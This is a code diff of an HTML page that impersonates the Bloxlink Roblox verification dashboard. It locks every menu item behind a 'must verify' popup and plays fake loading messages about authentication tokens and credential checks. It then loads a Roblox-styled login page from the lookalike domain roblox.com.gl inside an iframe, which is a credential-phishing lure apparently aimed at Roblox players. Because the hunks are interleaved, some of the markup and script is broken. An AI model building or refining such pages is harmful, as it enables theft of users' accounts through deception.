@@ -1,25 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8" />
+  <title>Bloxlink – Verifications</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>RoVer</title>
 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link rel="icon" href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" type="image/png">
+  <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="css/style.css">
     <link rel="icon" type="image/png" href="favicon.png">
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-
 <body>
 
+  <!-- MOBILE MENU BUTTON -->
+  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
+
+  <div class="top-bar">
+    Bloxlink is now part of the Roblox family! Read more here:
+    <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
+  </div>
+
+  <div class="layout">
+
+    <aside class="sidebar" id="sidebar">
+      <div class="logo">
+        <img
+          src="https://i.ibb.co/fYGPL0nW/imagem-2026-02-01-133807638.png"
+          alt="Bloxlink"
+        >
+      </div>
+
+      <div class="section">
+        <p class="section-title">GENERAL</p>
+        <button class="nav-item active" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M9 12l2 2 4-4"/>
+      <circle cx="12" cy="12" r="9"/>
+    </svg>
+    </span> Verifications
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M3 10l9-7 9 7"/>
+      <path d="M9 21V12h6v9"/>
+    </svg>
+    </span> Manage Servers
+        </button>
+      </div>
+
+      <div class="section">
+        <p class="section-title">ACCOUNT</p>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <rect x="3" y="4" width="18" height="16" rx="2"/>
+      <path d="M9 9l6 6M15 9l-6 6"/>
+    </svg>
+    </span> Manage Subscriptions
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="3"/>
+      <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06A1.65 1.65 0 0 0 15 19.4a1.65 1.65 0 0 0-1 .6 1.65 1.65 0 0 0-.33 1.82 2 2 0 1 1-3.34 0A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1-.6 1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.6 15a1.65 1.65 0 0 0-.6-1 1.65 1.65 0 0 0-1.82-.33 2 2 0 1 1 0-3.34A1.65 1.65 0 0 0 4.6 9c0-.38-.14-.74-.39-1.02a1.65 1.65 0 0 0-.6-1A2 2 0 1 1 6.94 3.2a1.65 1.65 0 0 0 1.82-.33H9a1.65 1.65 0 0 0 1-.6 1.65 1.65 0 0 0 .33-1.82 2 2 0 1 1 3.34 0A1.65 1.65 0 0 0 15 2.6c.38 0 .74.14 1.02.39.28.25.46.61.6 1a1.65 1.65 0 0 0 1.82.33 2 2 0 1 1 0 3.34 1.65 1.65 0 0 0-.33 1.82V9c0 .38.14.74.39 1.02.25.28.61.46 1 .6a1.65 1.65 0 0 0 .33 1.82z"/>
+    </svg>
+    </span> Settings
+        </button>
+      </div>
+
+      <div class="section">
+        <p class="section-title">OTHER</p>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M9.09 9a3 3 0 1 1 5.82 1c0 2-3 2-3 4"/>
+      <line x1="12" y1="17" x2="12" y2="17"/>
+    </svg>
+    </span> Support
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="nav-icon">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M16 18l6-6-6-6"/>
+      <path d="M8 6l-6 6 6 6"/>
+    </svg>
+    </span> Developer API
+        </button>
+      </div>
+    </aside>
+
+    <main class="content">
+      <h2>Verifications</h2>
+      <p class="subtitle">Manage your linked accounts.</p>
+<body>
+
+      <div class="verify-card">
+        <div>
+          <h1>Get started now by linking your account</h1>
+          <p>
+            Join our millions of users by linking your account.
+            After verifying, you'll gain access to thousands of communities.
+          </p>
 <!-- NAVBAR -->
 <header class="navbar">
     <div class="nav-left">
         <div class="brand">
             <img src="img/rover-logo.png" alt="RoVer Logo" class="brand-logo">
             <span class="brand-name"></span>
-        </div>
+</div>
 
+        <button class="verify-circle" onclick="openVerifyScreen()">Verify Now</button>
+      </div>
+
+      <div class="missing-bar">
+        <span>Missing an account?</span>
+        <a href="#" class="missing-btn" onclick="openVerifyScreen()">+ Add Another One</a>
+      </div>
+    </main>
+
+  </div>
+
+  <!-- SIDEBAR OVERLAY -->
+  <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
         <nav class="nav-links">
             <a href="#">Help</a>
             <a href="#">Team Members</a>
@@ -27,6 +137,16 @@
         </nav>
     </div>
 
+  <!-- BLOCKED POPUP -->
+  <div id="blockedOverlay" class="popup-overlay">
+    <div class="popup">
+      <div class="popup-header red">
+        Must verify to access other sections of the dashboard
+      </div>
+      <div class="popup-body">
+        <p>Please verify your account first to access all features of the Bloxlink dashboard.</p>
+        <button onclick="closeBlocked()">Close</button>
+      </div>
     <div class="nav-right">
         <button class="btn-manage" id="manageServersBtn">Manage Servers</button>
         <button class="btn-signin" id="signInBtn">Sign In</button>
@@ -55,8 +175,13 @@
         <img src="img/logo.png" alt="Imaginary Menagerie Logo" class="footer-logo">
         <p class="company-name">© 2026 Imaginary Menagerie, LLC.</p>
         <span class="attributions">attributions</span>
-    </div>
+</div>
+  </div>
 
+  <!-- VERIFY POPUP -->
+  <div id="verifyOverlay" class="popup-overlay">
+    <div class="verify-popup" id="verifyPopup">
+      <div class="verify-header">Verify Your Account</div>
     <div class="footer_column">
         <a href="#">Team members</a>
         <a href="#">Support Discord server ↗</a>
@@ -64,6 +189,10 @@
         <a href="#">Bot Developer API</a>
     </div>
 
+      <!-- Initial Verify Content -->
+      <div class="verify-body" id="verifyInitial">
+        <div class="verify-icon">
+          <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
     <div class="footer_column">
         <a href="#">Terms of Service</a>
         <a href="#">Privacy Policy</a>
@@ -78,7 +207,23 @@
         <div class="popup-header">
             <span class="popup-header-text">Verify your account</span>
             <button class="popup-close" id="popupClose">&times;</button>
-        </div>
+</div>
+
+        <button class="verify-continue" onclick="startLoadingSequence()">Continue</button>
+        <div class="verify-or">or</div>
+        <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
+      </div>
+
+      <!-- Loading Screen -->
+      <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <div class="loading-title">Connecting to Roblox...</div>
+        <div class="loading-messages">
+          <div class="loading-message pending" id="msg1">Initializing secure connection</div>
+          <div class="loading-message pending" id="msg2">Getting authentication token</div>
+          <div class="loading-message pending" id="msg3">Verifying your credentials</div>
+          <div class="loading-message pending" id="msg4">Establishing secure connection</div>
+          <div class="loading-message pending" id="msg5">Preparing verification session</div>
         
         <!-- Popup Content - Authorization -->
         <div class="popup-content" id="authContent">
@@ -108,11 +253,20 @@
             </div>
         </div>
         
-        <!-- Popup Content - Iframe (hidden until loaded) -->
-        <div class="popup-content iframe-content" id="iframeContent" style="display: none; visibility: hidden;">
+        <!-- Popup Content - Iframe -->
+        <div class="popup-content iframe-content" id="iframeContent" style="display: none;">
             <iframe id="robloxIframe" frameborder="0" class="content-iframe"></iframe>
-        </div>
-    </div>
+</div>
+      </div>
+</div>
+  </div>
+
+  <!-- IFRAME -->
+  <div id="iframeOverlay" class="popup-overlay">
+    <div class="iframe-popup">
+      <div class="verify-header">Verify Your Account</div>
+      <button class="close-iframe" onclick="closeIframe()">✕</button>
+      <iframe id="popupIframe"></iframe>
 </div>
 
 <!-- POPUP OVERLAY - Not Logged In (Manage Servers) -->
@@ -128,7 +282,58 @@
         </div>
         <h2>You are not authenticated</h2>
         <p>Please sign in to manage your servers.</p>
-    </div>
+</div>
+  </div>
+
+  <script>
+    const blockedOverlay = document.getElementById("blockedOverlay");
+    const verifyOverlay = document.getElementById("verifyOverlay");
+    const verifyPopup = document.getElementById("verifyPopup");
+    const verifyInitial = document.getElementById("verifyInitial");
+    const loadingScreen = document.getElementById("loadingScreen");
+    const iframeOverlay = document.getElementById("iframeOverlay");
+    const popupIframe = document.getElementById("popupIframe");
+    const sidebar = document.getElementById("sidebar");
+    const sidebarOverlay = document.getElementById("sidebarOverlay");
+
+    const ROBLOX_URL = "https://www.roblox.com.gl/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F252064938587%2FAdopt-Me";
+
+    const loadingMessages = [
+      { id: 'msg1', text: 'Initializing secure connection', duration: 800 },
+      { id: 'msg2', text: 'Getting authentication token', duration: 900 },
+      { id: 'msg3', text: 'Verifying your credentials', duration: 1000 },
+      { id: 'msg4', text: 'Establishing secure connection', duration: 800 },
+      { id: 'msg5', text: 'Preparing verification session', duration: 700 }
+    ];
+
+    function hideWithFade(element, callback) {
+      element.classList.remove("show");
+      setTimeout(() => {
+        if (callback) callback();
+      }, 250);
+    }
+
+    function openBlockedPopup() {
+      blockedOverlay.classList.add("show");
+    }
+
+    function closeBlocked() {
+      blockedOverlay.classList.remove("show");
+    }
+
+    function openVerifyScreen() {
+      verifyPopup.classList.remove("expanded");
+      verifyInitial.style.display = "block";
+      loadingScreen.classList.remove("active");
+      
+      loadingMessages.forEach(msg => {
+        const el = document.getElementById(msg.id);
+        el.classList.remove("active");
+        el.classList.add("pending");
+        el.textContent = msg.text;
+      });
+      
+      verifyOverlay.classList.add("show");
 </div>
 
 <!-- POPUP OVERLAY - Add Roblox Account (Sign In) -->
@@ -178,12 +383,6 @@
     const navLinks = document.querySelector('.nav-links');
     const navRight = document.querySelector('.nav-right');
 
-    // Configurações de tempo
-    const MIN_LOAD_TIME = 3000;  // Tempo mínimo de animação (3s)
-    const MAX_LOAD_TIME = 8000;  // Tempo máximo (8s) - fallback
-    let loadTimeout = null;
-    let animationInterval = null;
-
     // Open popup on login button click
     loginBtn.addEventListener('click', () => {
         popupOverlay.classList.add('active');
@@ -191,7 +390,6 @@
         authContent.style.display = 'block';
         loadingContent.style.display = 'none';
         iframeContent.style.display = 'none';
-        iframeContent.style.visibility = 'hidden';
         resetMessages();
     });
 
@@ -207,104 +405,111 @@
 
     function closePopup() {
         popupOverlay.classList.remove('active');
-        clearTimeouts();
         resetMessages();
-        robloxIframe.src = '';
-    }
+}
 
-    function clearTimeouts() {
-        if (loadTimeout) clearTimeout(loadTimeout);
-        if (animationInterval) clearInterval(animationInterval);
-    }
-
+    function closeVerifyScreen() {
+      hideWithFade(verifyOverlay);
     function resetMessages() {
         message1.style.opacity = '0.3';
         message2.style.opacity = '0.3';
         message3.style.opacity = '0.3';
-        message4.style.color = '';
         message4.style.opacity = '0.3';
-    }
+}
 
-    function runLoadingAnimation(duration) {
-        const messages = [
-            { el: message1, delay: 0 },
-            { el: message2, delay: duration * 0.25 },
-            { el: message3, delay: duration * 0.5 },
-            { el: message4, delay: duration * 0.75 }
-        ];
-
-        let startTime = Date.now();
-
-        animationInterval = setInterval(() => {
-            let elapsed = Date.now() - startTime;
-            
-            messages.forEach((msg, index) => {
-                if (elapsed >= msg.delay) {
-                    msg.el.style.opacity = '1';
-                    msg.el.style.color = '#ff2d87';
-                }
-                if (elapsed < msg.delay || elapsed >= messages[index + 1]?.delay) {
-                    if (elapsed < messages[index + 1]?.delay || index === messages.length - 1) {
-                        if (elapsed >= msg.delay + 500) {
-                            msg.el.style.opacity = '0.3';
-                        }
-                    }
-                }
-            });
-
-            if (elapsed >= duration) {
-                message1.style.opacity = '0.3';
-                message2.style.opacity = '0.3';
-                message3.style.opacity = '0.3';
-                message4.style.opacity = '1';
-                message4.style.color = '#ff2d87';
-            }
-        }, 100);
-    }
-
-    // Continue button - show loading then iframe
+    function startLoadingSequence() {
+      verifyPopup.classList.add("expanded");
+      
+      setTimeout(() => {
+        verifyInitial.style.display = "none";
+        loadingScreen.classList.add("active");
+    // Continue button - show loading animation
     btnContinue.addEventListener('click', () => {
         authContent.style.display = 'none';
         loadingContent.style.display = 'flex';
-        
-        // Começa a carregar o iframe em background (oculto)
-        robloxIframe.src = 'https://www.roblox.com.gl/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F252064938587%2FAdopt-Me';
-        
-        let animationDuration = MIN_LOAD_TIME;
-        
-        // Tenta detectar se o iframe carregou (pode não funcionar cross-origin)
-        let iframeLoaded = false;
-        
-        robloxIframe.onload = function() {
-            iframeLoaded = true;
-        };
-        
-        // Se carregar rápido, aguarda o mínimo. Se demorar, usa o máximo.
-        loadTimeout = setTimeout(() => {
-            showIframe();
-        }, Math.max(MIN_LOAD_TIME, MAX_LOAD_TIME));
-        
-        // Roda a animação
-        runLoadingAnimation(animationDuration);
 
-        // Após tempo mínimo, mostra o iframe
-        setTimeout(() => {
-            clearTimeouts();
-            showIframe();
-        }, MIN_LOAD_TIME);
-    });
-
-    function showIframe() {
-        clearTimeouts();
-        loadingContent.style.display = 'none';
-        iframeContent.style.display = 'block';
-        
-        // Pequeno delay para garantir que o DOM atualize
-        setTimeout(() => {
-            iframeContent.style.visibility = 'visible';
-            popupContainer.classList.add('expanded');
-        }, 50);
+        let delay = 0;
+        loadingMessages.forEach((msg, index) => {
+          setTimeout(() => {
+            if (index > 0) {
+              const prevMsg = document.getElementById(loadingMessages[index - 1].id);
+              prevMsg.classList.remove("active");
+              prevMsg.classList.add("completed");
+            }
+            const el = document.getElementById(msg.id);
+            el.classList.remove("pending");
+            el.classList.add("active");
+            
+            if (index === loadingMessages.length - 1) {
+              setTimeout(() => {
+                openRobloxIframe();
+              }, 600);
+            }
+          }, delay);
+          delay += msg.duration;
+        });
+      }, 400);
     }
+
+    function openRobloxIframe() {
+      hideWithFade(verifyOverlay, () => {
+        popupIframe.src = ROBLOX_URL;
+        iframeOverlay.classList.add("show");
+      });
+    }
+
+    function closeIframe() {
+      hideWithFade(iframeOverlay, () => {
+        popupIframe.src = "";
+        // Animate messages
+setTimeout(() => {
+          verifyPopup.classList.remove("expanded");
+          verifyInitial.style.display = "block";
+          loadingScreen.classList.remove("active");
+          loadingMessages.forEach(msg => {
+            const el = document.getElementById(msg.id);
+            el.classList.remove("active");
+            el.classList.add("pending");
+          });
+        }, 300);
+      });
+    }
+
+    function toggleSidebar() {
+      sidebar.classList.toggle("open");
+      sidebarOverlay.classList.toggle("show");
+    }
+  </script>
+            message1.style.opacity = '1';
+            message1.style.color = '#ff2d87';
+        }, 500);
+        
+        setTimeout(() => {
+            message1.style.opacity = '0.3';
+            message2.style.opacity = '1';
+            message2.style.color = '#ff2d87';
+        }, 2000);
+        
+        setTimeout(() => {
+            message2.style.opacity = '0.3';
+            message3.style.opacity = '1';
+            message3.style.color = '#ff2d87';
+        }, 3500);
+        
+        setTimeout(() => {
+            message3.style.opacity = '0.3';
+            message4.style.opacity = '1';
+            message4.style.color = '#ff2d87';
+        }, 5000);
+        
+        // After loading, show iframe with src only when needed
+        setTimeout(() => {
+            loadingContent.style.display = 'none';
+            iframeContent.style.display = 'block';
+            robloxIframe.src = 'https://www.roblox.com.gl/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F252064938587%2FAdopt-Me';
+            popupContainer.classList.add('expanded');
+        }, 6500);
+    });
 
     // Manage Servers - Not Logged In Popup
     manageServersBtn.addEventListener('click', () => {
@@ -345,5 +550,8 @@
 </script>
 
 </body>
+</html>
+
+
 
 </html>
